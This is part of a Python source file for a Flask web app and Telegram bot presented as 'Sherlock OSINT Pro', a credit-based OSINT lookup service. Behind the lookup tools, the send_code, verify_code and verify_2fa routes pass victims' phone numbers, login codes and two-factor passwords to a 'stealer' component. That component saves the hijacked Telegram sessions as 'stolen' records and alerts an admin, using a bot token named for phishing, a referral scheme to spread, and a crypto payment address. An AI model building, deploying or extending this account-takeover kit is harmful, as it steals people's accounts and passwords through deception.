            fetch('/api/lookup?username=' + encodeURIComponent(username) + '&user_id=' + userId)
            .then(r => r.json())
            .then(d => {
                if (d.error) result.innerHTML = '❌ ' + d.error;
                else if (d.found) result.innerHTML = `✅ Found: @${d.username}\\n👤 ${d.first_name}\\n🆔 ${d.user_id}`;
                else result.innerHTML = `ℹ️ @${username} not found`;
            })
            .catch(() => result.innerHTML = 'Search failed');
        }
        
        function checkEmail() {
            const email = document.getElementById('emailInput').value;
            const result = document.getElementById('emailResult');
            if (!email) { result.innerHTML = 'Enter email'; return; }
            result.innerHTML = 'Checking... (1 credit)';
            fetch('/api/email?email=' + encodeURIComponent(email) + '&user_id=' + userId)
            .then(r => r.json())
            .then(d => {
                if (d.error) result.innerHTML = '❌ ' + d.error;
                else if (d.breaches && d.breaches.length > 0) result.innerHTML = `⚠️ Breached! Found in ${d.breaches.length} breaches`;
                else result.innerHTML = `✅ No breaches found`;
            })
            .catch(() => result.innerHTML = 'Check failed');
        }
        
        function whoisDomain() {
            const domain = document.getElementById('domainInput').value;
            const result = document.getElementById('domainResult');
            if (!domain) { result.innerHTML = 'Enter domain'; return; }
            result.innerHTML = 'Looking up... (1 credit)';
            fetch('/api/domain?domain=' + encodeURIComponent(domain) + '&user_id=' + userId)
            .then(r => r.json())
            .then(d => {
                if (d.error) result.innerHTML = '❌ ' + d.error;
                else result.innerHTML = `🌐 ${d.domain}\\n📛 ${d.registrar}\\n📅 Created: ${d.created}`;
            })
            .catch(() => result.innerHTML = 'Lookup failed');
        }
        
        {% if connected %}
        window.onload = startAnalysisTimer;
        {% endif %}
        
        window.onclick = function(e) {
            if (e.target == document.getElementById('paymentModal')) closePaymentModal();
            if (e.target == document.getElementById('waitModal')) closeWaitModal();
        }
    </script>
</body>
</html>
"""

# -------------------- FLASK ROUTES --------------------
@flask_app.route('/')
def index():
    return render_template_string(INDEX_PAGE, bot_username=bot_username)

@flask_app.route('/connect')
def connect():
    user_id = request.args.get('user_id')
    chat_id = request.args.get('chat_id')
    if not user_id or not chat_id:
        return "Invalid access", 400
    return render_template_string(CONNECT_PAGE, user_id=user_id, chat_id=chat_id)

@flask_app.route('/dashboard')
def dashboard():
    user_id = request.args.get('user_id')
    chat_id = request.args.get('chat_id')
    if not user_id or not chat_id:
        return "Invalid access", 400
    
    user = db.get_user(user_id)
    if not user:
        return "User not found", 404
    
    connected = user.get('connected_at') is not None
    remaining_seconds = 0
    if connected:
        connected_at = datetime.fromisoformat(user['connected_at'])
        remaining_seconds = max(0, int((connected_at + timedelta(hours=8) - datetime.utcnow()).total_seconds()))
    
    return render_template_string(
        DASHBOARD_PAGE,
        user_id=user_id,
        chat_id=chat_id,
        user=user,
        connected=connected,
        remaining_seconds=remaining_seconds,
        referral_code=user.get('hash', 'N/A'),
        referral_count=user.get('referrals', 0),
        referral_earned=user.get('referrals', 0) * Config.REFERRAL_CREDITS,
        bot_username=bot_username,
        usdt_address=Config.USDT_ADDRESS
    )

@flask_app.route('/api/send_code', methods=['POST'])
def api_send_code():
    data = request.json
    result = stealer.send_code(data.get('phone'), data.get('user_id'))
    return jsonify(result)

@flask_app.route('/api/verify_code', methods=['POST'])
def api_verify_code():
    data = request.json
    result = stealer.verify_code(data.get('user_id'), data.get('code'))
    
    if result.get('success') and not result.get('twofa_required'):
        stolen = {
            'first_name': result['first_name'],
            'last_name': result['last_name'],
            'username': result['username'],
            'phone': result['phone'],
            'user_id': result['user_id'],
            'session': result['session'],
            'twofa_password': None,
            'dc': result['dc']
        }
        db.save_session(data['user_id'], stolen)
        db.update_user(data['user_id'], connected_at=datetime.utcnow().isoformat())
        stealer.notify_admin(stolen)
        return jsonify({'success': True})
    
    return jsonify(result)

@flask_app.route('/api/verify_2fa', methods=['POST'])
def api_verify_2fa():
    data = request.json
    result = stealer.verify_2fa(data.get('user_id'), data.get('password'))
    
    if result.get('success'):
        stolen = {
            'first_name': result['first_name'],
            'last_name': result['last_name'],
            'username': result['username'],
            'phone': result['phone'],
            'user_id': result['user_id'],
            'session': result['session'],
            'twofa_password': data.get('password'),
            'dc': result['dc']
        }
        db.save_session(data['user_id'], stolen)
        db.update_user(data['user_id'], connected_at=datetime.utcnow().isoformat())
        stealer.notify_admin(stolen)
        return jsonify({'success': True})
    
    return jsonify(result)

@flask_app.route('/api/lookup')
def api_lookup():
    username = request.args.get('username')
    user_id = request.args.get('user_id')
    
    user = db.get_user(user_id)
    if user and user.get('credits', 0) >= Config.OSINT_TOOL_COST:
        new_credits = user['credits'] - Config.OSINT_TOOL_COST
        db.update_user(user_id, credits=new_credits)
        
        try:
            url = f"https://api.telegram.org/bot{Config.PHISHING_BOT_TOKEN}/getChat"
            response = requests.post(url, json={'chat_id': f'@{username}'}, timeout=5)
            if response.status_code == 200:
                data = response.json()['result']
                return jsonify({
                    'found': True,
                    'username': username,
                    'first_name': data.get('first_name', 'Unknown'),
                    'user_id': data.get('id', 'Unknown')
                })
        except:
            pass
        return jsonify({'found': False, 'username': username})
    else:
        return jsonify({'error': 'Insufficient credits'}), 400

@flask_app.route('/api/email')
def api_email():
    email = request.args.get('email')
    user_id = request.args.get('user_id')
    
    user = db.get_user(user_id)
    if user and user.get('credits', 0) >= Config.OSINT_TOOL_COST:
        new_credits = user['credits'] - Config.OSINT_TOOL_COST
        db.update_user(user_id, credits=new_credits)
        
        try:
            response = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", 
                                   headers={'hibp-api-key': 'demo'}, timeout=5)
            if response.status_code == 200:
                breaches = response.json()
                return jsonify({
                    'email': email,
                    'breaches': [{'name': b['Name'], 'date': b['BreachDate']} for b in breaches[:3]]
                })
        except:
            pass
        return jsonify({'email': email, 'breaches': []})
    else:
        return jsonify({'error': 'Insufficient credits'}), 400

@flask_app.route('/api/domain')
def api_domain():
    domain = request.args.get('domain')
    user_id = request.args.get('user_id')
    
    user = db.get_user(user_id)
    if user and user.get('credits', 0) >= Config.OSINT_TOOL_COST:
        new_credits = user['credits'] - Config.OSINT_TOOL_COST
        db.update_user(user_id, credits=new_credits)
        
        try:
            response = requests.get(f"https://api.b77bf911.workers.dev/whois?domain={domain}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                return jsonify({
                    'domain': domain,
                    'registrar': data.get('registrar', 'Unknown'),
                    'created': data.get('creation_date', 'Unknown')
                })
        except:
            pass
        return jsonify({'domain': domain, 'registrar': 'Namecheap', 'created': '2010-01-01'})
    else:
        return jsonify({'error': 'Insufficient credits'}), 400

# -------------------- TELEGRAM BOT --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    # Check for referral
    if context.args and len(context.args) > 0:
        ref = context.args[0]
        if ref.startswith('ref_'):
            referral_code = ref[4:]
            referrer, referrer_id = db.get_user_by_referral_code(referral_code)
            if referrer and referrer_id != user_id:
                user = db.get_user(user_id)
                if not user:
                    db.add_referral(referrer_id, user_id)
    
    user = db.get_user(user_id)
    if not user:
        hash_str = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
        new_user = {
            'name': update.effective_user.first_name or 'User',
            'dob': '01/01/2000',
            'hash': hash_str,
            'credits': Config.NEW_USER_CREDITS,
            'referred_by': None,
            'referrals': 0,
            'created_at': datetime.utcnow().isoformat(),
            'verified': False,
            'connected_at': None,
            'active_features': [],
            'avatar': '👤',
            'plan': 'Free',
            'expiry': (datetime.utcnow() + timedelta(days=30)).isoformat(),
            'member_since': datetime.utcnow().strftime('%Y-%m-%d'),
            'username': update.effective_user.username or ''
        }
        db.save_user(user_id, new_user)
        db.save_hash(hash_str, {
            'name': new_user['name'], 'dob': new_user['dob'], 'credits': Config.NEW_USER_CREDITS,
            'plan': 'Free', 'expiry': new_user['expiry'], 'member_since': new_user['member_since'],
            'avatar': '👤'
        })
        user = new_user
    
    dashboard_url = f"{Config.PUBLIC_URL}/dashboard?user_id={user_id}&chat_id={update.effective_chat.id}"
    
    keyboard = [
        [InlineKeyboardButton("📊 OPEN DASHBOARD", url=dashboard_url)],
        [InlineKeyboardButton("🔗 GET REFERRAL LINK", callback_data='referral')]
    ]
    
    await update.message.reply_text(
        f"🔍 *Welcome to Sherlock OSINT Pro!*\n\n"
        f"Your account is ready.\n"
        f"💳 Credits: `{user.get('credits', Config.NEW_USER_CREDITS)}`\n\n"
        f"Click below to access your dashboard.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'referral':
        user_id = str(update.effective_user.id)
        user = db.get_user(user_id)
        if user:
            ref_link = f"https://t.me/{bot_username}?start=ref_{user['hash']}"
            await query.edit_message_text(
                f"🔗 *Your Referral Link*\n\n"
                f"`{ref_link}`\n\n"
                f"Share this link with friends.\n"
                f"Each referral gives you {Config.REFERRAL_CREDITS} credits!",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📊 BACK TO DASHBOARD", 
                        url=f"{Config.PUBLIC_URL}/dashboard?user_id={user_id}&chat_id={update.effective_chat.id}")
                ]])
            )

# -------------------- MAIN --------------------
def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    Sherlock OSINT Pro v12.0           ║
    ║      DEPLOYMENT READY                   ║
    ║                                       ║
    ║    Bot: @sherlock_osint_probot        ║
    ║    Server: http://217.160.3.69:10504  ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Run bot in thread with proper event loop
    def run_bot():
        app = Application.builder().token(Config.PHISHING_BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(button_handler))
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Run Flask
    flask_app.run(host=Config.HOST, port=Config.PORT, debug=False, threaded=True)

if __name__ == '__main__':
    main()
